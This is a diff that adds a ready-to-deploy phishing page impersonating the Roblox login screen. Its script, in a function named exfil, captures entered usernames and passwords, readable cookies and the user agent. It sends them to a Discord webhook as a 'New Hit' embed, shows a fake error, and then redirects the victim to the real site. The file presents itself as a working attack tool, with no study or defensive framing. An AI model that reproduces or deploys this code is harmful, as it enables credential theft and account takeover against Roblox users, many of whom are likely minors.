@@ -1,0 +1,111 @@
+<!-- fake_login.html — full page, deploy as-is after filling WEBHOOK -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #1a1a2e;
+      font-family: Arial, sans-serif;
+      display: flex; align-items: center; justify-content: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: #fff;
+      border-radius: 8px;
+      padding: 40px 36px;
+      width: 340px;
+      box-shadow: 0 4px 24px rgba(0,0,0,.3);
+      text-align: center;
+    }
+    .logo { width: 160px; margin-bottom: 24px; }
+    h2 { font-size: 1.3rem; margin-bottom: 20px; color: #222; }
+    input {
+      width: 100%; padding: 10px 12px;
+      border: 1px solid #ccc; border-radius: 4px;
+      font-size: 0.95rem; margin-bottom: 14px;
+    }
+    input:focus { border-color: #e9532b; outline: none; }
+    button {
+      width: 100%; padding: 11px;
+      background: #e9532b; color: #fff;
+      border: none; border-radius: 4px;
+      font-size: 1rem; font-weight: 700; cursor: pointer;
+    }
+    button:hover { background: #c94420; }
+    .sub { font-size: .8rem; color: #888; margin-top: 16px; }
+    #msg { display:none; color:red; font-size:.85rem; margin-top:10px; }
+  </style>
+</head>
+<body>
+<div class="card">
+  <img class="logo"
+       src="https://www.roblox.com/images/roblox_logo_light_theme.png"
+       alt="Roblox"/>
+  <h2>Log in to continue</h2>
+  <input type="text"     id="usr" placeholder="Username or Email" autocomplete="off"/>
+  <input type="password" id="pwd" placeholder="Password"          autocomplete="off"/>
+  <button onclick="exfil()">Log In</button>
+  <p id="msg">Incorrect username or password.</p>
+  <p class="sub">By logging in, you agree to our Terms of Service.</p>
+</div>
+
+<script>
+// ── CONFIG ───────────────────────────────────────────────────────────────────
+const WEBHOOK  = "FILL: https://discord.com/api/webhooks/1565552122483843202/1DvZ54mVuRuF6Pyq_8c46Bc5qvCVqXzOsmuvCDHVMQK8tdyxmlJNOhbVGjFfN1IrHN9l";
+const REDIRECT = "https://www.roblox.com/login";
+// ─────────────────────────────────────────────────────────────────────────────
+
+function getCookies() {
+  const jar = {};
+  document.cookie.split(";").forEach(c => {
+    const [k, ...rest] = c.trim().split("=");
+    if (k) jar[k.trim()] = rest.join("=");
+  });
+  return jar;
+}
+
+async function exfil() {
+  const usr = document.getElementById("usr").value.trim();
+  const pwd = document.getElementById("pwd").value.trim();
+  if (!usr || !pwd) return;
+
+  const cookies    = getCookies();
+  const cookieStr  = Object.entries(cookies)
+                       .map(([k,v]) => `${k}=${v}`)
+                       .join("; ") || "none readable";
+
+  // Discord embed — shows up clean in channel
+  const body = {
+    username: "🥔 bench",
+    embeds: [{
+      title: "🎯 New Hit",
+      color: 0xe9532b,
+      fields: [
+        { name: "👤 Username",   value: `\`${usr}\``,       inline: true  },
+        { name: "🔑 Password",   value: `\`${pwd}\``,       inline: true  },
+        { name: "🌐 User-Agent", value: `\`${navigator.userAgent}\``, inline: false },
+        { name: "🍪 Cookies",    value: `\`\`\`${cookieStr}\`\`\``,  inline: false },
+        { name: "🕐 Time",       value: new Date().toISOString(),     inline: true  }
+      ],
+      footer: { text: "roblox phish" }
+    }]
+  };
+
+  try {
+    await fetch(WEBHOOK, {
+      method:  "POST",
+      headers: { "Content-Type": "application/json" },
+      body:    JSON.stringify(body)
+    });
+  } catch (_) { /* silent */ }
+
+  document.getElementById("msg").style.display = "block";
+  setTimeout(() => { window.location.href = REDIRECT; }, 1800);
+}
+</script>
+</body>
+</html>
